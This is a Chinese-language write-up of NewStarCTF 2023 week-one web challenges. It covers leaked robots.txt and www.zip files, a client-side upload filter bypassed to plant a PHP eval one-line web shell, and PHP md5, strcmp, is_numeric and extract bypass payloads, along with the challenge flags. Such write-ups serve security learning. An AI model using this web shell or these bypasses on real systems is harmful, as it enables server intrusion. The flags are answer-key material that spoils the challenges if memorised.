# NewStarCTF_2023

## WEEK1|WEB 泄露的秘密

进入给定靶机提示**“粗心的管理员泄漏了一些敏感信息，请你找出他泄漏的两个敏感信息！”**：

1. 敏感信息很容易想到robots.txt，通过url访问robots.txt也确实有信息，得到第一段flag

   ```tex
   PART ONE: flag{r0bots_1s_s0_us3ful
   ```

2. 对于第二个敏感信息由于题目做得不多，试了网上说的常见的还是不行，干脆直接dirsearch扫服务器的目录发现除了robots.txt可以访问之外还有www.zip可以访问，在url添加www.zip下载压缩包，解压得到一个index.php文件中有第二段flag

   ```php
   $PART_TWO = "_4nd_www.zip_1s_s0_d4ng3rous}";
   ```


## WEEK1|WEB Begin of Upload

通过题目可以看到应该是利用文件上传的漏洞，在google浏览器先上传一个php文件发现有过滤，在**设置**中对js进行禁止就可以成功上传php文件，php文件内容如下：（利用一句话木马）

```php
<?php @eval($_POST['attack']);?>
```

成功将文件上传后利用蚁剑连接一句话木马成功进入服务器，在服务器的文件列表发现有f11114g文件打开得到flag

```tex
flag{b082c1e5-526a-4dbd-a5c4-00fa035bfb3c}
```

![1](https://github.com/2aurora2/CTF-WriteUp/blob/main/NewStarCTF_2023/image/1.png)

## WEEK1|WEB Begin of PHP

通过对题目进行分析应该就是要通过传递参数最后拿到flag

1. 第一步代码：

   ```php
   if(isset($_GET['key1']) && isset($_GET['key2'])){
       echo "=Level 1=<br>";
       if($_GET['key1'] ! == $_GET['key2'] && md5($_GET['key1']) == md5($_GET['key2'])){
           $flag1 = True;
       }else{
           die("nope,this is level 1");
       }
   }
   ```

   这一步考察的是md5的弱比较，对于这种的处理方式这里采用的是数组绕过，当对key1和key2传递一个数组后，md5会得到null，null=null就会返回true

   payload：(GET方式)

   ```bash
   ?key1[]=1&key2[]=2
   ```

2. 第二步代码：

   ```php
   if($flag1){
       echo "=Level 2=<br>";
       if(isset($_POST['key3'])){
           if(md5($_POST['key3']) === sha1($_POST['key3'])){
               $flag2 = True;
           }
       }else{
           die("nope,this is level 2");
       }
   }
   ```

   md5和sha1函数对数组经过加密后得到都是null，因此这里也是对key3传递一个数组即可

   payload：(POST方式)

   ```bash
   key3[]=1
   ```

3. 第三步代码：

   ```php
   if($flag2){
       echo "=Level 3=<br>";
       if(isset($_GET['key4'])){
           if(strcmp($_GET['key4'],file_get_contents("/flag")) == 0){
               $flag3 = True;
           }else{
               die("nope,this is level 3");
           }
       }
   }
   ```

   这一步是考察strcmp的绕过问题，strcmp比较的是字符串类型，如果强行传入其他类型参数，会出错，出错后返回值0，正是利用这点进行绕过

   payload：(GET方式)

   ```bash
   key4[]=1
   ```

4. 第四步代码：

   ```php
   if($flag3){
       echo "=Level 4=<br>";
       if(isset($_GET['key5'])){
           if(!is_numeric($_GET['key5']) && $_GET['key5'] > 2023){
               $flag4 = True;
           }else{
               die("nope,this is level 4");
           }
       }
   }
   ```

   这一步是对is_numeric的绕过，如果指定的变量是数字和数字字符串则返回 TRUE，否则返回 FALSE，浮点型返回空值即 FALSE，不仅检查十进制，同时也检查十六进制。绕过方法是is_numeric函数对于空字符%00，无论是%00放在前后都可以判断为非数值，而%20空格字符只能放在数值后，因为查看函数发现该函数对于第一个空格字符会跳过空格字符直接判断后面的内容；

   payload：(GET方式)

   ```bash
   // 这里如果用%002024不行
   key5=2024%00
   ```

5. 第五步代码：

   ```php
   if($flag4){
       echo "=Level 5=<br>";
       extract($_POST);
       foreach($_POST as $var){
           if(preg_match("/[a-zA-Z0-9]/",$var)){
               die("nope,this is level 5");
           }
       }
       if($flag5){
           echo file_get_contents("/flag");
       }else{
           die("nope,this is level 5");
       }
   }
   ```

   这一步代码会遍历POST参数，并且会进行正则匹配，只有当flag5这个参数为true时才会输出flag。这里要对正则匹配进行绕过，关于正则匹配的绕过有很多方式，这里利用和上面一样的方式，数组绕过即可

   payload：(POST方式)

   ```bash
   flag5[]=true
   ```

   即可得到flag
